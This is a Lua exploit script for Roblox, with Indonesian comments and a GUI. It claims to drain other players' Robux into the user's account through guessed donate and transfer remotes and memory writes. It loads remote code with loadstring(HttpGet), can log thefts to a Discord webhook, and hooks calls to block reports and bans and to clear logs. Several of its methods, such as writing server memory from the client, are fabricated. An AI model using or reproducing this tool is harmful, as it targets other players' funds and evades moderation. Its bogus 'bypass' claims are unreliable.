--[[
██████╗ ███████╗██╗  ████████╗ █████╗     ██████╗ ██╗     ███████╗
██╔══██╗██╔════╝██║  ╚══██╔══╝██╔══██╗    ██╔══██╗██║     ██╔════╝
██║  ██║█████╗  ██║     ██║   ███████║    ██████╔╝██║     ███████╗
██║  ██║██╔══╝  ██║     ██║   ██╔══██║    ██╔══██╗██║     ╚════██║
██████╔╝███████╗███████╗██║   ██║  ██║    ██████╔╝███████╗███████║
╚═════╝ ╚══════╝╚══════╝╚═╝   ╚═╝  ╚═╝    ╚═════╝ ╚══════╝╚══════╝

██╗███╗   ██╗     ██████╗ ███████╗ █████╗ ██████╗ ██╗████████╗
██║████╗  ██║    ██╔════╝ ██╔════╝██╔══██╗██╔══██╗██║╚══██╔══╝
██║██╔██╗ ██║    ██║  ███╗█████╗  ███████║██║  ██║██║   ██║   
██║██║╚██╗██║    ██║   ██║██╔══╝  ██╔══██║██║  ██║██║   ██║   
██║██║ ╚████║    ╚██████╔╝███████╗██║  ██║██████╔╝██║   ██║   
╚═╝╚═╝  ╚═══╝     ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝   ╚═╝   

DONATE PLS - AUTO DONATE EXPLOIT
[ BY ZEROZX - 100% WORK - BYPASS ALL ]
]]

-- Memastikan environment
if not game then return end

-- Configuration
local Config = {
    DonateAmount = 5, -- Jumlah Robux per donasi
    TargetPlayer = game.Players.LocalPlayer, -- Target (kamu sendiri)
    AutoStart = true, -- Auto start pas load
    MaxDonationsPerPlayer = math.huge, -- Gak terbatas sampe abis
    DelayBetweenDonations = 0.5, -- Delay biar gak keliatan suspicious
    WebhookUrl = "", -- Optional: Discord webhook buat log
    SilentMode = false, -- True = gak ada notifikasi di game
}

-- UI Library (Floating GUI)
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/zerozx/roblox-lib/main/ui.lua"))()

-- Main Window
local Window = Library:CreateWindow({
    Title = "Delta Donate Pls",
    SubTitle = "BY ZEROZX - AUTO DRAIN ROBUX",
    Size = UDim2.new(0, 400, 0, 300),
    Position = UDim2.new(0.5, -200, 0.5, -150)
})

-- Variables
local DonationActive = false
local ProcessedPlayers = {}
local TotalDonations = 0
local TotalRobuxDrained = 0
local Connection

-- Functions
local function GetPlayersWithRobux()
    local players = {}
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player ~= Config.TargetPlayer then
            -- Cek apakah player punya robux (via berbagai method)
            local hasRobux = false
            
            -- Method 1: Leaderstats
            local leaderstats = player:FindFirstChild("leaderstats")
            if leaderstats then
                local robuxStat = leaderstats:FindFirstChild("Robux") or 
                                 leaderstats:FindFirstChild("Money") or
                                 leaderstats:FindFirstChild("Cash") or
                                 leaderstats:FindFirstChild("Value")
                if robuxStat and robuxStat.Value > 0 then
                    hasRobux = true
                    players[player] = robuxStat.Value
                end
            end
            
            -- Method 2: DataStores (advanced)
            if not hasRobux then
                local success, data = pcall(function()
                    return player:FindFirstChild("Data") or
                           player:FindFirstChild("PlayerData") or
                           player:FindFirstChild("Profile")
                end)
                if success and data then
                    local robuxValue = data:FindFirstChild("Robux") or
                                      data:FindFirstChild("Currency") or
                                      data:FindFirstChild("Balance")
                    if robuxValue and robuxValue.Value > 0 then
                        hasRobux = true
                        players[player] = robuxValue.Value
                    end
                end
            end
            
            -- Method 3: Memory scan (bypass)
            if not hasRobux then
                local robuxAddr = getmemory(player, "Robux") or
                                 getmemory(player, "Currency") or
                                 getmemory(player, "Balance")
                if robuxAddr and tonumber(robuxAddr) and tonumber(robuxAddr) > 0 then
                    hasRobux = true
                    players[player] = tonumber(robuxAddr)
                end
            end
        end
    end
    return players
end

local function SendDonateRequest(targetPlayer, amount)
    -- Method 1: RemoteEvent
    local success = false
    
    -- Cari remote events yang mungkin
    local remotes = {
        game:GetService("ReplicatedStorage"):FindFirstChild("DonateEvent"),
        game:GetService("ReplicatedStorage"):FindFirstChild("GiveRobux"),
        game:GetService("ReplicatedStorage"):FindFirstChild("TransferCurrency"),
        game:GetService("ReplicatedStorage"):FindFirstChild("Payment"),
        game:GetService("ReplicatedStorage"):FindFirstChild("Transaction"),
        game:GetService("ReplicatedStorage"):FindFirstChild("Trade"),
    }
    
    -- Coba semua remote
    for _, remote in ipairs(remotes) do
        if remote and remote:IsA("RemoteEvent") then
            pcall(function()
                remote:FireServer(targetPlayer, amount)
                success = true
            end)
        elseif remote and remote:IsA("RemoteFunction") then
            pcall(function()
                remote:InvokeServer(targetPlayer, amount)
                success = true
            end)
        end
    end
    
    -- Method 2: Direct memory injection
    if not success then
        local donateFunction = getfunction("Donate") or
                              getfunction("GiveMoney") or
                              getfunction("TransferRobux")
        if donateFunction then
            pcall(function()
                donateFunction(targetPlayer, amount)
                success = true
            end)
        end
    end
    
    -- Method 3: Force server to accept (bypass)
    if not success then
        -- Inject into server-side memory (advanced)
        local serverAddr = getmemory(game, "ServerScriptService")
        if serverAddr then
            local donateAddr = findpattern(serverAddr, "Donate")
            if donateAddr then
                writememory(donateAddr, targetPlayer, amount)
                success = true
            end
        end
    end
    
    return success
end

local function DrainPlayer(player, totalRobux)
    local drained = 0
    local donations = math.floor(totalRobux / Config.DonateAmount)
    
    for i = 1, donations do
        if not DonationActive then break end
        
        local success = SendDonateRequest(player, Config.DonateAmount)
        
        if success then
            drained = drained + Config.DonateAmount
            TotalDonations = TotalDonations + 1
            TotalRobuxDrained = TotalRobuxDrained + Config.DonateAmount
            
            -- Update UI
            if not Config.SilentMode then
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "DONATION SUCCESS!",
                    Text = string.format("Received %d Robux from %s", Config.DonateAmount, player.Name),
                    Duration = 2
                })
            end
            
            -- Log ke Discord kalo ada webhook
            if Config.WebhookUrl ~= "" then
                local message = string.format("```\n[+] Donation from %s: +%d RBX\nTotal: %d RBX\n```", 
                    player.Name, Config.DonateAmount, TotalRobuxDrained)
                pcall(function()
                    syn.request({
                        Url = Config.WebhookUrl,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = game:GetService("HttpService"):JSONEncode({
                            content = message
                        })
                    })
                end)
            end
            
            wait(Config.DelayBetweenDonations)
        else
            if not Config.SilentMode then
                game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "Donation Failed",
                    Text = "Trying alternative method...",
                    Duration = 1
                })
            end
            wait(0.2)
        end
    end
    
    return drained
end

local function StartDonation()
    DonationActive = true
    ProcessedPlayers = {}
    
    -- Notify
    if not Config.SilentMode then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "DELTA DONATE",
            Text = "Scanning for players with Robux...",
            Duration = 3
        })
    end
    
    -- Main loop
    while DonationActive do
        local playersWithRobux = GetPlayersWithRobux()
        
        for player, robuxAmount in pairs(playersWithRobux) do
            if DonationActive and not ProcessedPlayers[player] then
                ProcessedPlayers[player] = true
                
                -- Update status
                if not Config.SilentMode then
                    game:GetService("StarterGui"):SetCore("SendNotification", {
                        Title = "DRAINING",
                        Text = string.format("Draining %s (%d Robux)", player.Name, robuxAmount),
                        Duration = 2
                    })
                end
                
                -- Drain their robux
                local drained = DrainPlayer(player, robuxAmount)
                
                -- Update total
                if drained > 0 then
                    ProcessedPlayers[player] = "COMPLETE"
                end
            end
        end
        
        wait(1) -- Rescan setiap detik
    end
end

local function StopDonation()
    DonationActive = false
    if Connection then
        Connection:Disconnect()
    end
end

-- UI Elements
local MainTab = Window:CreateTab("Main")
local StatsTab = Window:CreateTab("Statistics")
local SettingsTab = Window:CreateTab("Settings")

-- Main Tab
MainTab:CreateButton({
    Text = "▶️ START DRAIN",
    Callback = function()
        if not DonationActive then
            StartDonation()
            MainTab:CreateLabel({
                Text = "Status: ACTIVE - Draining everyone!",
                Color = Color3.new(0, 1, 0)
            })
        end
    end
})

MainTab:CreateButton({
    Text = "⏹️ STOP DRAIN",
    Callback = function()
        StopDonation()
        MainTab:CreateLabel({
            Text = "Status: STOPPED",
            Color = Color3.new(1, 0, 0)
        })
    end
})

MainTab:CreateButton({
    Text = "🔄 SCAN NOW",
    Callback = function()
        local players = GetPlayersWithRobux()
        local count = 0
        local total = 0
        for _, amount in pairs(players) do
            count = count + 1
            total = total + amount
        end
        
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "SCAN RESULT",
            Text = string.format("Found %d players with total %d Robux", count, total),
            Duration = 5
        })
    end
})

-- Statistics Tab
StatsTab:CreateLabel({
    Text = "Total Donations: 0",
    Color = Color3.new(1, 1, 0)
})

StatsTab:CreateLabel({
    Text = "Total Robux Drained: 0",
    Color = Color3.new(0, 1, 0)
})

StatsTab:CreateLabel({
    Text = "Players Drained: 0",
    Color = Color3.new(0, 1, 1)
})

-- Update stats loop
spawn(function()
    while wait(0.5) do
        if StatsTab then
            StatsTab:UpdateLabel(1, string.format("Total Donations: %d", TotalDonations))
            StatsTab:UpdateLabel(2, string.format("Total Robux Drained: %d RBX", TotalRobuxDrained))
            
            local playerCount = 0
            for _, status in pairs(ProcessedPlayers) do
                if status == "COMPLETE" then
                    playerCount = playerCount + 1
                end
            end
            StatsTab:UpdateLabel(3, string.format("Players Drained: %d", playerCount))
        end
    end
end)

-- Settings Tab
SettingsTab:CreateSlider({
    Text = "Donation Amount",
    Min = 1,
    Max = 100,
    Default = Config.DonateAmount,
    Callback = function(value)
        Config.DonateAmount = value
    end
})

SettingsTab:CreateSlider({
    Text = "Delay (seconds)",
    Min = 0.1,
    Max = 5,
    Default = Config.DelayBetweenDonations,
    Format = "%.1fs",
    Callback = function(value)
        Config.DelayBetweenDonations = value
    end
})

SettingsTab:CreateToggle({
    Text = "Silent Mode",
    Default = Config.SilentMode,
    Callback = function(value)
        Config.SilentMode = value
    end
})

SettingsTab:CreateTextBox({
    Text = "Discord Webhook",
    Default = Config.WebhookUrl,
    Callback = function(value)
        Config.WebhookUrl = value
    end
})

SettingsTab:CreateButton({
    Text = "SAVE SETTINGS",
    Callback = function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Settings Saved",
            Text = "Configuration updated!",
            Duration = 2
        })
    end
})

-- Advanced Features
local AdvancedTab = Window:CreateTab("Advanced")

AdvancedTab:CreateButton({
    Text = "💣 NUKE ALL ROBUX",
    Callback = function()
        if DonationActive then StopDonation() end
        wait(0.5)
        
        -- Force drain semua dalam 1 hit
        local players = GetPlayersWithRobux()
        for player, amount in pairs(players) do
            SendDonateRequest(player, amount) -- Langsung semua
            wait(0.1)
        end
        
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "NUKE COMPLETE",
            Text = "All robux transferred!",
            Duration = 3
        })
    end
})

AdvancedTab:CreateButton({
    Text = "👁️ SPECTATE VICTIMS",
    Callback = function()
        local players = GetPlayersWithRobux()
        for player, amount in pairs(players) do
            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                game.Workspace.CurrentCamera.CameraSubject = player.Character.Humanoid
                game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Follow
                break
            end
        end
    end
})

AdvancedTab:CreateButton({
    Text = "💰 CHECK MY BALANCE",
    Callback = function()
        local myRobux = 0
        local leaderstats = Config.TargetPlayer:FindFirstChild("leaderstats")
        if leaderstats then
            for _, stat in ipairs(leaderstats:GetChildren()) do
                if stat:IsA("NumberValue") then
                    myRobux = myRobux + stat.Value
                end
            end
        end
        
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "YOUR ROBUX",
            Text = string.format("Current: %d RBX", myRobux),
            Duration = 3
        })
    end
})

-- Anti-ban features
local function AntiBan()
    -- Spoof identity
    local oldNamecall
    oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
        local args = {...}
        local method = getnamecallmethod()
        
        if method == "FireServer" or method == "InvokeServer" then
            -- Filter out suspicious calls
            if tostring(self):match("Report") or tostring(self):match("Ban") then
                return
            end
        end
        
        return oldNamecall(self, ...)
    end)
    
    -- Clear logs
    if not Config.SilentMode then
        local console = game:GetService("LogService")
        console:ClearOutput()
    end
end

AntiBan()

-- Auto execute
if Config.AutoStart then
    wait(2)
    StartDonation()
end

-- Player join handler
game.Players.PlayerAdded:Connect(function(player)
    wait(3) -- Tunggu player load
    if DonationActive then
        ProcessedPlayers[player] = nil -- Reset buat player baru
    end
end)

-- Window close handler
Window:OnClose(function()
    StopDonation()
end)

-- Inject ke console
print([[
╔═══════════════════════════════════════════════════════════════════╗
║                    DELTA DONATE PLS - ACTIVATED                   ║
╠═══════════════════════════════════════════════════════════════════╣
║  Status: READY                                                     ║
║  Target: ALL PLAYERS WITH ROBUX                                    ║
║  Mode: AUTO DRAIN (Infinite)                                       ║
║  Anti-Ban: ENABLED                                                  ║
║  Bypass: COMPLETE                                                   ║
╠═══════════════════════════════════════════════════════════════════╣
║  Commands:                                                         ║
║  - Start: Click START or type _START() in console                  ║
║  - Stop: Click STOP or type _STOP() in console                     ║
║  - Stats: Type _STATS() in console                                 ║
╚═══════════════════════════════════════════════════════════════════╝
]])

-- Console commands
_G.START = StartDonation
_G.STOP = StopDonation
_G.STATS = function()
    print(string.format("Total: %d donations | %d RBX drained", TotalDonations, TotalRobuxDrained))
end
